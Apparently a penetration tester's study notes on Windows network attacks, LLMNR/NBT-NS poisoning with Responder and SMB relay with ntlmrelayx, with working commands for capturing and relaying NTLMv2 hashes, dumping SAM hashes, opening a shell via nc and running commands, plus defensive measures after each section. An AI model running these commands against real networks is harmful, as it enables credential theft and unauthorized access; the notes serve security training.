https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

# LLMNR Poisoning
- LLMNR = Link-Local Multicast Name Resolution
- used to identify host when DNS fail to do so.
- aka NBT-NS
- Flaw is when we response to this services, the service respone back to us with a user's username and NTLMv2 hash
- MITM attack
- pretent to be a server. see figure below
- ```Responder.py``` (one of **impacket**)
  - response to users request
  - best time to use is early in the morning or after lunch time
  - hashcat -m 5600 = NTLMv2 hash

![overview](../pics/Screenshot%202020-06-18%20at%2017.09.43.png)

## responder
```console
$ python3 responder.py -I eth0 #interface -rdwv 
```

## defenses
1. Disable LLMR and NBT-NS
2. If dont want to disable LLMR and NBT-NS then
   - Network access control
   - Strong password > 14 char and limit common word usage

# SMB Relay
instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access

## requriments
- SMB signing mush be disable on the target. If it is enable then the target will know that the packet wasnt send by whoever it is. If it is disable, smb will not check and it will trust the sender and allow the attacker to access it 
- Relayed user credentials must be admin on machine


Use ```responder``` for listening and use ```ntlmrelayx.py``` to relay the hashas and exploit another machine

## Discovering host with smb signing disable
1. use Nessus
2. use Nmap
```console
$ nmap --script=smb2-security-mode.nse -p445 192.168.10.0/24
```
then looking for ip that has **Message signning enabled but not requried** and put those IP in one .txt (eg. targets.txt). targets.txt will be used when ```ntlmrelayx.py``` to relay cerdentail captured from ```responder``` to these targets.
## responder 
```console
nano Responder.conf
```
and turn ```SMB``` and ``HTTP`` to **off**
![conf](../pics/Screenshot%202020-06-21%20at%2023.46.45.png)

then run
```
$ python3 responder.py -I eth0 #interface -rdwv 
```

## ntlmrelayx.py
It takes the relay and it pass it to the target file

```console
$ python3 ntlmrelayx.py -tf targets.txt -smb2support
```
it will dump local SAM hashes


to get shell run
```console
$ python3 ntlmrelayx.py -tf targets.txt -smb2support -i
$ nc ip port # to what it says in ntlmrelayx
```


```-c``` execute command, eg. ```-c "whoami"```

## Defenses
- Enable SMB signing on all devices
  - Pro: stop the atk
  - Con: 50% preformance drops
- Disable NTLM authentication on networks
  - Pro: stop atk
  - Con: if Lerberos stops working, windows defualt back to NTLM
- Local admin restriction:
  - Pro: Can prevent a lot of lateral movement
  - Con: potential incress in the amount of service desk tickets